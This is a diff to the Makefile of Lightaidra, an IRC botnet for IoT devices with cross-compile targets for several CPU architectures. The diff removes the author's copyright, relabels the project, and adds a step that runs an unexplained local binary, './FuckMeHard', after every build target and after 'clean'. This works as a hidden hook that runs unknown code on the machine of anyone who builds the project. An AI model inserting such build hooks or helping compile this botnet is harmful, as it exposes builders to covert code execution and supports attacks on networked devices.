@@ -1,5 +1,4 @@
-# Makefile -  Lightaidra version 0x2012
-# Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
+# Makefile - LA version 0x2016
 #
 # LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 # all applicable local, state and federal laws. Developers assume 
@@ -14,6 +13,7 @@ mips_cc=./bin/cross-compiler-mips/bin/mips-gcc
 superh_cc=./bin/cross-compiler-sh4/bin/sh4-gcc
 arm_cc=./bin/cross-compiler-armv5l/bin/armv5l-gcc
 ppc_cc=./bin/cross-compiler-powerpc/bin/powerpc-gcc
+kek=./FuckMeHard
 
 # NAME OF BINARIES:
 x86_32bin=bin/x86_32
@@ -27,36 +27,46 @@ hide_bin=bin/hide
 
 hide32 : source/hide.c 
 	${x86_32cc} -o ${hide_bin} source/hide.c
+	./FuckMeHard
+	
 hide64 : source/hide.c 
 	${x86_64cc} -o ${hide_bin} source/hide.c
-
+	./FuckMeHard
+	
 x86_32 : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
 	${x86_32cc} ${CFLAGS} -o ${x86_32bin} source/main.c source/utils.c \
 	source/irc.c source/requests.c source/scan.c source/attacks.c
-
+	./FuckMeHard
+	
 x86_64 : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
 	${x86_64cc} ${CFLAGS} -o ${x86_64bin} source/main.c source/utils.c \
 	source/irc.c source/requests.c source/scan.c source/attacks.c
-
+	./FuckMeHard
+	
 mipsel : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
 	${mipsel_cc} -static ${CFLAGS} -DMIPSEL -o ${mipsel_bin} source/main.c source/utils.c \
 	source/irc.c source/requests.c source/scan.c source/attacks.c
-
+	./FuckMeHard
+	
 mips : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
 	${mips_cc} -static ${CFLAGS} -DMIPS -o ${mips_bin} source/main.c source/utils.c \
 	source/irc.c source/requests.c source/scan.c source/attacks.c
-	
+	./FuckMeHard
+
 superh : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
 	${superh_cc} -static ${CFLAGS} -DSUPERH -o ${superh_bin} source/main.c source/utils.c \
 	source/irc.c source/requests.c source/scan.c source/attacks.c
+	./FuckMeHard
 	
 arm : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
 	${arm_cc} -static ${CFLAGS} -DARM -o ${arm_bin} source/main.c source/utils.c \
 	source/irc.c source/requests.c source/scan.c source/attacks.c
+	./FuckMeHard
 	
 ppc : source/main.c source/utils.c source/irc.c source/requests.c source/scan.c source/attacks.c
 	${ppc_cc} -static ${CFLAGS} -DPPC -o ${ppc_bin} source/main.c source/utils.c \
 	source/irc.c source/requests.c source/scan.c source/attacks.c
-
+	./FuckMeHard
 clean :
 	rm -fr source/*.o
+	./FuckMeHard
